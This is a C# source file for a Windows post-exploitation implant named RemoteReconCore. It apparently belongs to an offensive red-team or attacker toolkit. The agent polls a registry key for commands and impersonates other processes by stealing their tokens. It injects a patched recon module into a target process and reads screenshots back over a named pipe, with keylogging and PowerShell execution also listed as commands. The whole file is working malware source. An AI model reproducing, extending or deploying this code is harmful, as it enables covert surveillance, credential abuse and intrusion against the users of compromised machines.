using System;
using System.Text;
using System.Reflection;
using Microsoft.Win32;
using System.Security.Principal;
using System.IO;
using System.IO.Pipes;
using System.Threading;
using ReflectiveInjector;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace RemoteReconCore
{
    [ComVisible(true)]
    public class Agent
    {
        public Agent()
        {

        }

        public void Run(string basepath, string runkey, string commandkey, string argumentkey, string resultkey, string keylogkey, string screenshotkey)
        {
            //open base key
            RegistryKey hklm = Registry.LocalMachine;

            //Get the recon module from the embedded resource
            //mod = GetReconModule();
#if DEBUG
            Console.WriteLine("Opening Remote Recon base key");
#endif
            if ((rrbase = hklm.OpenSubKey(basepath, RegistryKeyPermissionCheck.ReadWriteSubTree)) == null)
                System.Environment.Exit(0); /*Exit because we couldn't open the basekey*/

            modkey = runkey;
            while (rrbase.GetValue(runkey) != null)
            {
                //main loop
                Thread.Sleep((sleep * 1000));
                int cmd;
                if ((cmd = (int)rrbase.GetValue(commandkey)) == 0)
                    continue; /*Continue if no cmd*/

                command = new KeyValuePair<int, object>(cmd, rrbase.GetValue(argumentkey));
                Exec();

                //Post results to the appropriate key
                switch (command.Key)
                {
                    case (int)Cmd.Impersonate:
#if DEBUG
                        Console.WriteLine("Writing Impersonate command Result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        rrbase.SetValue(runkey, Convert.ToBase64String(Encoding.ASCII.GetBytes((string)result.Value)), RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        //rrbase.SetValue(runkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        break;
                    case (int)Cmd.Screenshot:
#if DEBUG
                        Console.WriteLine("Writing Screenshot command Result");
#endif
                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
                        if (result.Key == 0) rrbase.SetValue(screenshotkey, result.Value, RegistryValueKind.String);
                        else rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
                        rrbase.SetValue(commandkey, 0);
                        rrbase.SetValue(argumentkey, "");
                        rrbase.SetValue(runkey, "");
                        command = new KeyValuePair<int, object>(0, "");
                        break;
                    default:
                        break;
                }
            }
        }

        private void Exec()
        {
            //Check the command keyvalue pair for a new command.
            if ((int)Cmd.Impersonate == command.Key)
            {
#if DEBUG
                Console.WriteLine("Received Impersonate command");
#endif
                impersonate(Convert.ToInt32(command.Value));
            }
            else if ((int)Cmd.Screenshot == command.Key)
            {
#if DEBUG 
                Console.WriteLine("Received Screenshot command");
#endif
                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                GetScreenShot(Convert.ToInt32(command.Value));
            }
        }

        private static int sleep = 5;
        private static WindowsImpersonationContext context = null;
        //private string exceptionInfo;
        private byte[] mod;
        public static string modkey;
        public static KeyValuePair<int, object> command;
        public static KeyValuePair<int, object> result;
        RegistryKey rrbase;

        public enum Result : int
        {
            Success = 0,
            InjectFailed = 1,
            ScreenShotFailed = 2,
            KeylogFailed = 3,
            ImpersonateFailed = 4,
            PSFailed = 5,
            AssemblyFailed = 6
        }

        public enum Cmd : int
        {
            Impersonate = 1,
            Keylog = 2,
            Screenshot = 3,
            PowerShell = 4,
            Revert = 5,
            Assembly = 6
        }

        private void impersonate(int pid)
        {
            IntPtr hProcHandle = IntPtr.Zero;
            IntPtr hProcToken = IntPtr.Zero;

            if ((hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, true, pid)) == IntPtr.Zero)
                if ((hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_QUERY_INFORMATION, true, pid)) == IntPtr.Zero)
                    WinApi.CloseHandle(hProcHandle);

            if (!WinApi.OpenProcessToken(hProcHandle, WinApi.TOKEN_ALL_ACCESS, out hProcToken))
                WinApi.CloseHandle(hProcHandle);

            WindowsIdentity newId = new WindowsIdentity(hProcToken);

            try
            { 
                context = newId.Impersonate();
                result = new KeyValuePair<int, object>(0, "Impersonated: " + newId.Name);
            }
            catch (Exception e)
            {
                result = new KeyValuePair<int, object>(4, e.ToString());
            }
        }

        private void GetScreenShot(int pid)
        {
            string image = "";
            //Function for connecting to the remoting server and obtaining the screenshot
            //Inject the recon module into the target process.
            byte[] patchedMod = PatchRemoteReconNative("screenshot");
            Injector screenshot = new Injector(pid, patchedMod);
            
#if DEBUG
            Console.WriteLine("Created screenshot object");
#endif
            if (!screenshot.Inject())
                result = new KeyValuePair<int, object>(2, "Recon module injection failed.");
            else
            {
                //TODO: Write named pipe client to grab output from the remote module
#if DEBUG
                Console.WriteLine("Attempting to connect to named pipe");
#endif

                try
                {
                    NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_ss", PipeDirection.InOut);
                    
                    client.Connect((1000 * sleep));
                    StreamReader reader = new StreamReader(client);
                    image = reader.ReadLine();
                    
                    client.Close();
                    client.Dispose();
#if DEBUG
                    Console.WriteLine("Writing result");
#endif
                    result = new KeyValuePair<int, object>(0, image);
                }
                catch (Exception e)
                {
#if DEBUG
                    Console.WriteLine("Connect to namedpipe failed");
                    File.AppendAllText("c:\\agent.log", "Connect to named pipe failed\n");
#endif
                    result = new KeyValuePair<int, object>(2, e.ToString());
                }
            }
        }
        
        private byte[] GetReconModule()
        {
            string resourceName = "";
            string bytestring = "";
            if (IntPtr.Size == 8)
                resourceName = "RemoteReconCore.RemoteReconHostx64.txt";
            else
                resourceName = "RemoteReconCore.RemoteReconHostx86.txt";

            var assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            using (StreamReader reader = new StreamReader(stream))
            {
                bytestring = reader.ReadToEnd();
            }

            return Convert.FromBase64String(bytestring);
        }

        private byte[] PatchRemoteReconNative(string cmd)
        {
            byte[] cmdBytes = Encoding.ASCII.GetBytes(cmd);
            byte[] modCopy = mod;
            int index = 0;
            string moduleString = Encoding.ASCII.GetString(mod);
            index = moduleString.IndexOf("Replace-Me  ");

            if(index == 0)
                return new byte[1] { 0 };

            for (int i = 0; i < cmdBytes.Length; i++)
            {
                modCopy[index + i] = cmdBytes[i];
            }

            modCopy[index + cmdBytes.Length] = 0x00;
            modCopy[index + cmdBytes.Length + 1] = 0x00;

            return modCopy;
        }
    }
}
